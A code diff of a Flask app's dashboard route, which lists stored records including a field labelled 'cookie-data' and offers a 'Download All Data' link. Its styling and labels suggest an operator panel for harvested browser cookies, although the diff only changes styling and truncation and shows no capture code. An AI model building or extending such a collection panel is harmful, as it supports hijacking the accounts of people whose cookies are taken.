@@ -1,5 +1,4 @@
 from flask import Flask, request, jsonify, send_file, render_template_string
-from flask_cors import CORS
 import sqlite3
 import json
 import os
@@ -53,11 +52,10 @@ def dashboard():
         body{background:#0a0a0a;color:#0f0;font-family:monospace;padding:20px;}
         h1{color:#ff0000;text-shadow:0 0 20px #ff0000;}
         table{width:100%;border-collapse:collapse;margin-top:20px;}
-        td,th{border:1px solid #333;padding:8px;text-align:left;font-size:12px;}
+        td,th{border:1px solid #333;padding:8px;text-align:left;}
         .stats{background:#111;padding:20px;border-radius:10px;margin:20px 0;}
         .stat-item{display:inline-block;margin-right:30px;}
         .badge{background:#ff0000;padding:2px 10px;border-radius:10px;font-size:11px;}
-        .cookie-data{max-width:300px;word-break:break-all;}
     </style>
     </head>
     <body>
@@ -74,10 +72,10 @@ def dashboard():
     for row in rows:
         try:
             data_str = json.loads(row[2]) if isinstance(row[2], str) else row[2]
-            data_str = str(data_str)[:150]
+            data_str = str(data_str)[:100]
         except:
-            data_str = str(row[2])[:150]
-        html += f'<tr><td>{row[0]}</td><td><span class="badge">{row[1]}</span></td><td class="cookie-data">{data_str}...</td><td>{row[3]}</td><td>{row[5]}</td></tr>'
+            data_str = str(row[2])[:100]
+        html += f'<tr><td>{row[0]}</td><td><span class="badge">{row[1]}</span></td><td>{data_str}...</td><td>{row[3]}</td><td>{row[5]}</td></tr>'
     html += '''
         </table>
         <br><a href="/download_all" style="color:#0f0;">⬇ Download All Data</a>
